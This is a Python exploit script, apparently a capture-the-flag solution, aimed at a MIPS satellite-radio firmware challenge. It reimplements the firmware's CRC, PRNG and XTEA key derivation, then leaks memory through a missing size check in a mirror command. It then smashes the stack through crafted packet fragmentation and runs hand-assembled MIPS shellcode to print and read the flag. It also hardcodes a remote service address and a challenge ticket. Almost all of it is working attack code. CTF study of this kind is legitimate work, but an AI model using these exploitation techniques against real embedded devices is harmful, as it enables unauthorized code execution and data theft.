#!/usr/bin/env python3
"""
Dependency: pip install pwntools

Usage:

    export FLAG='This is my little secret'
    socat TCP-L:5065,fork,reuseaddr EXEC:'./vmips -o memsize=2097152 challenge.rom' 2>&1 | \
        grep --line-buffered -v -e '^ *$' \
            -e 'DEBUG::RLL::Radio Link Layer Process' \
            -e 'DEBUG::MAC::Process' \
            -e 'DEBUG::RLL::Radio Resource Layer Process' \
            -e 'DEBUG::RLL::UL MAC PDU'

    ./client.py
"""
import hashlib
import struct
import time
import sys
from pwn import remote


# With --real option, use the remote device
if len(sys.argv) >= 2 and sys.argv[1] == '--real':
    # conn = remote('launchlink.satellitesabove.me', 5065)
    conn = remote('52.14.23.173', 5065)
    conn.recvline()
    conn.sendline('ticket{echo43208echo:GIhF5KeXwG_3KV6pszqPNh1cPiS4P9rJVqn2LRWYedwoUwd97vRJ4TS0VYrw9UD4Cw}')
else:
    conn = remote('127.0.0.1', 5065)


# Reset MAC layer
conn.send_raw(b'\x13' * 0x40)
data = conn.recv_raw(1024)
print("Received MAC reset response {}".format(repr(data)))
assert data == b'\x13\x00\x13\x00'
# Log: DEBUG::CMac::SendRLLDataBlockSizeUpdate::newDataBlockSize=29
current_mac_block_size = 29


def MAC_crc16(data):
    """Compute the CRC-16 of the data, for MAC layer"""
    value = 0xffff
    for byte in data:
        for _ in range(8):
            value = (value >> 1) ^ (0x8408 if (byte ^ value) & 1 else 0)
            byte >>= 1
    return value ^ 0xffff


def MAC_send(opcode, data, do_padding=False):
    if do_padding:
        data += b'\x00' * (current_mac_block_size - len(data))
    assert len(data) == current_mac_block_size
    crc = MAC_crc16(data)
    conn.send_raw(struct.pack('>BH', opcode, crc) + data)


def MAC_set_blksize(newblksize):
    global current_mac_block_size
    MAC_send(0x79, struct.pack('B', newblksize + 3) + b'\x00' * (current_mac_block_size - 1))
    current_mac_block_size = newblksize


def MAC_recv():
    resp = b''
    while len(resp) < current_mac_block_size:
        new_resp = conn.recv_raw(current_mac_block_size + 3 - len(resp))
        assert new_resp, "disconnected :("
        resp += new_resp
    print("\033[34m[RECV<{}]: {}\033[m".format(len(resp), resp.hex()))
    assert len(resp) == current_mac_block_size + 3

    # Cut for the right CRC16
    opcode, expected_crc = struct.unpack('>BH', resp[:3])
    crc = MAC_crc16(resp[3:])
    if crc != expected_crc:
        print("WARNING: bad MAC CRC16: {:#x} != {:#x}".format(crc, expected_crc))
    return opcode, resp[3:]


def MAC_recv_data():
    opcode, data = MAC_recv()
    assert opcode == 0xe3
    return data


class PRNG:
    """Pseudo-Random Number generator used

    Source: https://www.ams.org/journals/mcom/1999-68-225/S0025-5718-99-00996-5/S0025-5718-99-00996-5.pdf
    """
    def __init__(self, seed=10):
        # Function 0xbfc044c0
        self.state = [None] * 16
        for idx in range(16):
            seed1 = (seed ^ (seed >> 12)) & 0xffffffffffffffff
            seed2 = (seed1 ^ (seed1 << 25)) & 0xffffffffffffffff
            seed = (seed2 ^ (seed2 >> 27)) & 0xffffffffffffffff
            self.state[idx] = (seed * 1803442709493370165) & 0xffffffffffffffff
        self.position = 0

    def get_u64(self):
        # Function 0xbfc04678
        state0 = self.state[self.position]
        self.position = (self.position + 1) % 16
        state1 = self.state[self.position]
        state2 = (state1 ^ (state1 << 27)) & 0xffffffffffffffff
        state3 = (state2 ^ (state2 >> 13)) & 0xffffffffffffffff
        state0 = (state0 ^ (state0 >> 46)) & 0xffffffffffffffff
        newstate = state0 ^ state3
        self.state[self.position] = newstate
        return (newstate * 1865811235122147685) & 0xffffffffffffffff

    def get_bytes(self, size):
        result = bytearray(size)
        for idx in range(size):
            result[idx] = self.get_u64() & 0xff
        return bytes(result)

    @classmethod
    def selfcheck(cls):
        prng = cls()
        first_values = (
            0xc5cc02a6245c0af8,
            0x6f2bf0ca6fe14e24,
            0x09058fe2734e5804,
            0xb87a8f3da50af994,
            0xeab0f9d098e288be,
            0x757d8c8fa386da5f,
            0x04d973839ab404b2,
            0x1b963bff5be1e83f,
            0x6801742e73cf6c09,
            0xa542575430c0277a,
            0x1461dadb395b6558,
            0x8436663222707fa3,
            0x2886a49fe1592333,
            0x7c19757afd34c48c,
            0x4c4b16ca3cde4b4c,
            0x774d3b011f615afd,
            0x9d2124e3fdd034eb,
            0x9294d3531adef944,
            0x6b7a77cf81443eb9,
            0x78ef553b1efdc873,
        )
        for idx, expected in enumerate(first_values):
            computed = prng.get_u64()
            assert computed == expected, "Wrong value #{}: {:#x} != {:#x}".format(idx, computed, expected)


PRNG.selfcheck()


def XTEA_crypt(block, key):
    v0, v1 = struct.unpack('<II', block)
    i_sum = 0x3e778b90
    for _ in range(16):
        v0 = (v0 + ((((v1 << 4) ^ (v1 >> 5)) + v1) ^ (i_sum + key[i_sum & 3]))) & 0xffffffff
        i_sum = (i_sum + 0x83e778b9) & 0xffffffff
        v1 = (v1 + ((((v0 << 4) ^ (v0 >> 5)) + v0) ^ (i_sum + key[(i_sum >> 11) & 3]))) & 0xffffffff
    return struct.pack('<II', v0, v1)


def XTEA_ECB(data, key):
    result = []
    for i in range(0, len(data), 8):
        result.append(XTEA_crypt(data[i:i + 8], key))
    return b''.join(result)


# Initialize the security context, which needs large MAC blocks
MAC_set_blksize(0xbd)  # Set MAC block size to 0xc0, RLL block size to 0xbd
client_random = b'\x00' * 0x60
MAC_send(0xe3, b'\x17\x70' + client_random, do_padding=True)
# With this:
# DEBUG::RRL::UL SHARED SECRET[73352259CDD6103744C33520C75DAB88)
# DEBUG::RRL::UL Negotiated security parameters MASTER KEY[3F4D621CCDD8DA7AF0E31524AE98888]
# UL IV(A3BA275820BEAFB) DL IV(265BD104B90DAB8B)
response = MAC_recv_data()
assert response.startswith(b'\x17\x9d')  # Server random secret
assert all(x == 0 for x in response[0x62:])
server_random = response[2:0x62]
KNOWN_SERVER_RANDOM = bytes.fromhex(
    'f8240494be5fb23f097a58a3338c4cfdeb44b973252eca2a89fe58de9de5c652' +
    'b35c3e89ee0b5b5db069e368c9ebf48165e1adbc12e9b9f8d1b7a8f7ef6f06a7' +
    '89dd291cc6199d366bb163409fbb2ecc02e10ac8652731405ef57b4b672f756b')
assert PRNG().get_bytes(0x60) == KNOWN_SERVER_RANDOM  # Sanity check
assert server_random == KNOWN_SERVER_RANDOM


DERIVATION_KEY = (0xa5b5c5d5, 0x12345678, 0x41414141, 0xcccccccc)
encrypted_client_random = XTEA_ECB(b'\x00' * 0x60, DERIVATION_KEY)
encrypted_server_random = XTEA_ECB(server_random, DERIVATION_KEY)
shared_secret = bytes(x ^ y for x, y in zip(encrypted_client_random, encrypted_server_random))

# Check by comparing the result with values in the log
check_shared_secret = "{0[0]:X}{0[1]:X}{0[2]:X}{0[3]:X}".format(struct.unpack('<IIII', shared_secret[:0x10]))
assert check_shared_secret == '73352259CDD6103744C33520C75DAB88'

master_key = struct.unpack('<IIII', hashlib.md5(shared_secret[:0x30]).digest())
all_iv = hashlib.md5(shared_secret[0x30:]).digest()
UL_iv = all_iv[:8]
DL_iv = all_iv[8:]
check_master_key = "{0[0]:X}{0[1]:X}{0[2]:X}{0[3]:X}".format(master_key)
check_UL_iv = "{0[0]:X}{0[1]:X}".format(struct.unpack('<II', UL_iv))
check_DL_iv = "{0[0]:X}{0[1]:X}".format(struct.unpack('<II', DL_iv))
assert check_master_key == '3F4D621CCDD8DA7AF0E31524AE98888'
assert check_UL_iv == 'A3BA275820BEAFB'
assert check_DL_iv == '265BD104B90DAB8B'


class XTEA_OFB_keystream:
    """Implement OFB mode with the patched XTEA encryption"""
    def __init__(self, iv, key):
        self.iv = iv
        self.key = key

    def crypt_block(self, block):
        self.iv = XTEA_crypt(self.iv, self.key)
        return bytes(x ^ y for x, y in zip(self.iv, block))

    def crypt_data(self, data):
        assert len(data) % 8 == 0
        result = []
        for i in range(0, len(data), 8):
            result.append(self.crypt_block(data[i:i + 8]))
        return b''.join(result)

    def pad_and_crypt_data(self, data):
        """Encrypt data which is not aligned, and truncate the padding in the end"""
        if len(data) % 8:
            padded_data = data + b'\x00' * (8 - (len(data) % 8))
        else:
            padded_data = data
        result = self.crypt_data(padded_data)
        return result[:len(data)]


UL_crypto_stream = XTEA_OFB_keystream(UL_iv, master_key)
DL_crypto_stream = XTEA_OFB_keystream(DL_iv, master_key)
print("Crypto OK :)")


def RLL_send_UL_fast(data):
    """Send a RLL::UL FAST_MESSAGE"""
    data += b'\x00' * (current_mac_block_size - 1 - len(data))  # The padding occurs BEFORE encryption/decryption
    encrypted = UL_crypto_stream.pad_and_crypt_data(data)
    payload = b'\xc3' + encrypted
    assert len(payload) == current_mac_block_size
    MAC_send(0xe3, payload)


def RLL_recv_DL_fast():
    data = MAC_recv_data()
    assert data[0] == 0xc3, "Not a RLL::DL FAST: %#x" % data[0]
    data = DL_crypto_stream.pad_and_crypt_data(data[1:])
    print("\033[34m[RECV-DECRYPTED_FAST<{}]: {}\033[m".format(len(data), data.hex()))
    return data


def RLL_send_UL_dedicated_fragment(seqnumber, is_last, fragment_index, data):
    """Send a fragment in RLL::UL DEDICATED_MESSAGE"""
    if not is_last or fragment_index:
        print("\033[33m[>FRAG] {:#06x} {} {}: {} bytes\033[m".format(
            seqnumber, is_last, fragment_index, len(data)))
    assert 0 <= seqnumber <= 0x7ff
    assert 0 <= is_last <= 1
    assert 0 <= fragment_index <= 0xf
    pktword = (is_last << 15) | (seqnumber << 4) | fragment_index
    data = struct.pack('<H', pktword) + data
    data += b'\x00' * (current_mac_block_size - 1 - len(data))  # The padding occurs BEFORE encryption/decryption
    encrypted = UL_crypto_stream.pad_and_crypt_data(data)
    payload = b'\x73' + encrypted
    assert len(payload) == current_mac_block_size
    MAC_send(0xe3, payload)


last_UL_dedicated_sequence = 0


def RLL_send_UL_dedicated(data):
    global last_UL_dedicated_sequence

    # Send fragments
    fragment_idx = 0
    while len(data) > current_mac_block_size - 3:
        RLL_send_UL_dedicated_fragment(last_UL_dedicated_sequence, 0, fragment_idx,
                                       data[:current_mac_block_size - 3])
        fragment_idx += 1
        data = data[current_mac_block_size - 3:]

    assert len(data) <= current_mac_block_size - 3
    # Send last packet
    RLL_send_UL_dedicated_fragment(last_UL_dedicated_sequence, 1, fragment_idx, data)
    last_UL_dedicated_sequence += 1


def RLL_recv_DL_dedicated():
    data = MAC_recv_data()
    assert data[0] == 0x73, "Not a RLL::DL DEDICATED: %#x" % data[0]
    data = DL_crypto_stream.pad_and_crypt_data(data[1:])
    pktword, = struct.unpack('<H', data[:2])
    print("\033[34m[RECV-DECRYPTED_DEDI<{}]: {:#06x}, {}\033[m".format(len(data), pktword, data[2:].hex()))
    is_last = pktword >> 15
    fragment_idx = pktword & 0xf
    if is_last and fragment_idx == 0:
        return data[2:]

    # Wait for other packets, to refragment
    fragmented_packets = [None] * 0x10
    fragmented_packets[fragment_idx] = data[2:]
    last_idx = None
    while True:
        data = MAC_recv_data()
        assert data[0] == 0x73, "Not a RLL::DL DEDICATED: %#x" % data[0]
        data = DL_crypto_stream.pad_and_crypt_data(data[1:])
        pktword, = struct.unpack('<H', data[:2])
        print("\033[34m[RECV-DECRYPTED_DEFR<{}]: {:#06x}, {}\033[m".format(len(data), pktword, data[2:].hex()))
        is_last = pktword >> 15
        fragment_idx = pktword & 0xf
        fragmented_packets[fragment_idx] = data[2:]
        if is_last:
            last_idx = fragment_idx
        if last_idx is not None and all(f is not None for f in fragmented_packets[:last_idx+1]):
            return b''.join(fragmented_packets[:last_idx+1])
        # print("Still waiting: {}, {}".format(last_idx, [f is not None for f in fragmented_packets]))


def AP_create(field_0x94, field_0x95, name):
    RLL_send_UL_dedicated(struct.pack('<BBBB', 0x23, field_0x94, field_0x95, len(name)) + name)
    response = RLL_recv_DL_dedicated()
    resp_code, = struct.unpack('>H', response[:2])
    if resp_code != 0x5e00:
        print("Error creating AP {}: {}".format(repr(name), response.hex()))
        raise ValueError
    handle, = struct.unpack('<I', response[2:6])
    print("[AP] Created {} @{:#010x}={}".format(repr(name), handle, handle))
    return handle


def AP_destroy(handle):
    RLL_send_UL_dedicated(struct.pack('<BI', 0x87, handle))
    response = RLL_recv_DL_dedicated()
    resp_code, = struct.unpack('>H', response[:2])
    if resp_code != 0x9400:
        print("Error destroying AP {:#x}: {}".format(handle, response.hex()))
        raise ValueError


def AP_info(handle):
    RLL_send_UL_dedicated(struct.pack('<BI', 0x52, handle))
    response = RLL_recv_DL_dedicated()
    resp_code, = struct.unpack('>H', response[:2])
    if resp_code != 0x2800:
        print("Error requesting AP {:#x}: {}".format(handle, response.hex()))
        raise ValueError
    text_size, = struct.unpack('<I', response[2:6])
    info = response[6:6 + text_size]
    print("[AP] Info @{:#010x}={}: {}".format(handle, handle, repr(info)))
    return info


def mirror(data):
    RLL_send_UL_dedicated(struct.pack('<BH', 0x71, len(data)) + data)
    response = RLL_recv_DL_dedicated()
    resp_code, data_len = struct.unpack('<BH', response[:3])
    if resp_code != 0xe2:
        print("Error mirroring {}".format(response.hex()))
        raise ValueError
    assert data_len == len(data)
    assert response[3:3 + data_len] == data


def write_to_ap(handle, data):
    RLL_send_UL_fast(struct.pack('<BIB', 0x01, handle, len(data)) + data)
    response = RLL_recv_DL_fast()
    resp_code, resp_handle, resp_size = struct.unpack('<BIB', response[:6])
    if resp_code != 0x01:
        print("Error writing to AP {:#x}: {}".format(handle, response.hex()))
        raise ValueError
    assert resp_handle == handle
    if resp_size != len(data):
        print("[AP] Warning: wrote {}/{} bytes".format(resp_size, len(data)))


def read_from_ap(handle, size):
    RLL_send_UL_fast(struct.pack('<BIB', 0x02, handle, size))
    response = RLL_recv_DL_fast()
    resp_code, resp_handle, resp_size = struct.unpack('<BIB', response[:6])
    if resp_code != 0x02:
        print("Error reading from AP {:#x}: {}".format(handle, response.hex()))
        raise ValueError
    assert resp_handle == handle
    assert resp_size <= size
    data = response[6:6+resp_size]
    if len(data) < resp_size:
        print("[AP] Truncated Data @{:#010x}={}: [{}/{}] {}".format(handle, handle, len(data), resp_size, repr(data)))
        return data
    assert len(data) == resp_size
    print("[AP] Data @{:#010x}={}: [{}] {}".format(handle, handle, len(data), repr(data)))
    return data


def checksum_ap(handle, offset, size):
    RLL_send_UL_dedicated(struct.pack('<BHIH', 0x3F, size, handle, offset))
    response = RLL_recv_DL_dedicated()
    resp_code, = struct.unpack('>H', response[:2])
    if resp_code != 0xaa8f:
        print("Error chksumming AP {:#x}: {}".format(handle, response.hex()))
        raise ValueError
    resp_handle, resp_crc = struct.unpack('<II', response[2:0xa])
    print("[AP] CRC32[{}:+{}] @{:#010x}={}: {:#010x}".format(offset, size, handle, handle, resp_crc))
    return resp_crc


def checksum_ap_expecting_an_error(handle, offset, size):
    RLL_send_UL_dedicated(struct.pack('<BHIH', 0x3F, size, handle, offset))
    response = RLL_recv_DL_dedicated()
    resp_code, = struct.unpack('>H', response[:2])
    if resp_code == 0xaa8f:
        # no overflow
        resp_handle, resp_crc = struct.unpack('<II', response[2:0xa])
        print("[AP] CRC32-noover[{}:+{}] @{:#010x}={}: {:#010x}".format(offset, size, handle, handle, resp_crc))
        return resp_crc

    if resp_code != 0xaa5d:
        print("Unexpected error while chksumming AP {:#x} with overflow: {}".format(handle, response.hex()))
        raise ValueError
    response = RLL_recv_DL_dedicated()
    resp_code, = struct.unpack('>H', response[:2])
    if resp_code != 0xaa8f:
        print("Error chksumming AP {:#x}: {}".format(handle, response.hex()))
        raise ValueError
    resp_handle, resp_crc = struct.unpack('<II', response[2:0xa])
    print("[AP] CRC32+overflow[{}:+{}] @{:#010x}={}: {:#010x}".format(offset, size, handle, handle, resp_crc))
    return resp_crc


def compute_CRC32(data):
    value = 0x512078cd
    for x in data:
        value ^= x
        for _ in range(8):
            value = (value >> 1) ^ (0xedb88320 if value & 1 else 0)
    return value ^ 0xffffffff


assert compute_CRC32(b'W') == 0xef74a5dd


def mirror_leak(size=0xffff):
    """Leak data from a missing size check in the firmware"""
    RLL_send_UL_dedicated(struct.pack('<BH', 0x71, size))
    response = RLL_recv_DL_dedicated()
    resp_code, data_len = struct.unpack('<BH', response[:3])
    if resp_code != 0xe2:
        print("Error mirroring {}".format(response.hex()))
        raise ValueError
    leak = response[3:3 + data_len]
    print("[MIRROR:{}] {}".format(len(leak), leak.hex()))
    return leak


# Leak some data
mirror_leak(2200)

# Make space in order not to overwrite the shellcode on the stack when calling functions
shellcode = bytes.fromhex("e8ecbd27")  # addiu sp,sp,-0x1318

# Enable debug log
shellcode += bytes.fromhex("c0bf023c")  # lui v0,0xbfc0
shellcode += bytes.fromhex("40184234")  # ori v0,v0,0x1840
shellcode += bytes.fromhex("09f84000")  # jalr v0 = 0xbfc01840 ; set_log_level(0xff)
shellcode += bytes.fromhex("ff000434")  # _ori a0,zero,0xff  (with delay slot)

# Print the flag: DBG_printf(0xff, 0xbfc09310="DEBUG::%s\n", s2=flag)
shellcode += bytes.fromhex("c0bf053c")  # lui a1,0xbfc0
shellcode += bytes.fromhex("1093a534")  # ori a1,a1,0x9310
shellcode += bytes.fromhex("25304002")  # or a2,s2,zero
shellcode += bytes.fromhex("09f8e002")  # jalr s7
shellcode += bytes.fromhex("ff000434")  # _ori a0,zero,0xff

# Find the node by handle: RRL_find_node_by_handle(RRL_ctx=0xa00fff5c, s0=handle)
shellcode += bytes.fromhex("0fa0043c")  # lui a0,0xa00f
shellcode += bytes.fromhex("5cff8434")  # ori a0,a0,0xff5c
shellcode += bytes.fromhex("25280002")  # or a1,s0,zero
shellcode += bytes.fromhex("c0bf023c")  # lui v0,0xbfc0
shellcode += bytes.fromhex("b4204234")  # ori v0,v0,0x20b4
shellcode += bytes.fromhex("09f84000")  # jalr v0 = 0xbfc020b4 = RRL_find_node_in_own_list_by_handle
shellcode += bytes.fromhex("00000000")  # nop

# Modify the buffer pointer of the node, at AP context + 0x98 + 0x10 = v0 + 0xa8
shellcode += bytes.fromhex("a80052ac")  # sw s2,0xa8(v0)

# Debug: print handle (A0111120 in real firmware, A0111158 with debug enabled)
shellcode += bytes.fromhex("ff000434")  # ori a0,zero,0xff
shellcode += bytes.fromhex("25286002")  # or a1,s3,zero ; "RRL::UL SHARED SECRET[%x%x%x%x)"
shellcode += bytes.fromhex("25304000")  # or a2,v0,zero
shellcode += bytes.fromhex("00000734")  # ori a3,zero,0x0
shellcode += bytes.fromhex("00000834")  # ori a4,zero,0x0
shellcode += bytes.fromhex("09f8e002")  # jalr s7         ; printf
shellcode += bytes.fromhex("00000000")  # nop

# Recover code execution: sp = 0xa00fece4, pc = 0xbfc08ed8
shellcode += bytes.fromhex("0fa01d3c")  # lui sp,0xa00f
shellcode += bytes.fromhex("e4ecbd37")  # ori sp,sp,0xece4
shellcode += bytes.fromhex("c0bf023c")  # lui v0,0xbfc0
shellcode += bytes.fromhex("d88e4234")  # ori v0,v0,0x8ed8
shellcode += bytes.fromhex("08004000")  # jr v0
shellcode += bytes.fromhex("00000000")  # nop

# Create a node for the flag
handle = AP_create(1, 2, b'NodeName')
write_to_ap(handle, b'@' * 0x80)  # Fill garbage, to be able to read the flag

# Exploit stack overflow in fragmentation
MAC_set_blksize(0x89)  # set newDataBlockSize=189 (315 fragments)

# Fill a buffer of 1280 = 0x500 bytes with a mirror command
payload = struct.pack('<BH', 0x71, 100) + b'xxxxx' + shellcode
payload += b'P' * (0x500 - len(payload))
assert len(payload) == 0x500

# Saved variables on the stack, that are restored
payload += struct.pack(
    '<IIIIIIIIIII',
    0xff, 0,
    handle,      # s0 = handle
    0,           # s1
    0xa2008000,  # s2 = flag
    0xbfc0981c,  # s3 = "RRL::UL SHARED SECRET[%x%x%x%x)"
    0,           # s4
    0,           # s5
    0,           # s6
    0xbfc017e0,  # s7 = DBG_printf
    0,           # s8
)

# Saved ra => address of the shellcode
# payload += struct.pack('<I', 0xbfc01744)  # call DBG_printf(4,"RLL timeout!\n");
payload += struct.pack('<I', 0xa00fe794 + 8)  # Run payload from the stack

frag_size = current_mac_block_size - 3
print("Sending {0}={0:#x} bytes in {1} fragments of {2}={2:#x} bytes".format(
    len(payload), (len(payload) + frag_size - 1) // frag_size, frag_size))
assert len(payload) < 0xf * frag_size

# Send first fragment to tell "hey, this is fragmented"
RLL_send_UL_dedicated_fragment(last_UL_dedicated_sequence, 0, 0, payload[:frag_size])
# Send more fragments from the 3rd one
for idx in range(2, (len(payload) + frag_size - 1)//frag_size):
    RLL_send_UL_dedicated_fragment(last_UL_dedicated_sequence, 0, idx, payload[frag_size*idx:frag_size*(idx+1)])

# Send the 2nd fragment with "is_last" bit set
RLL_send_UL_dedicated_fragment(last_UL_dedicated_sequence, 1, 1, payload[frag_size:frag_size*2])
last_UL_dedicated_sequence += 1

# Reset MAC layer to clean the PDU POOL
MAC_set_blksize(0xbd)
response = RLL_recv_DL_dedicated()

# Read the flag
read_from_ap(handle, 0x80)

# Check that everything looks fine
AP_info(handle)
AP_info(handle)

time.sleep(1)
while conn.can_recv():
    data = conn.recv()
    print("RECV++[%d] %r" % (len(data), data))
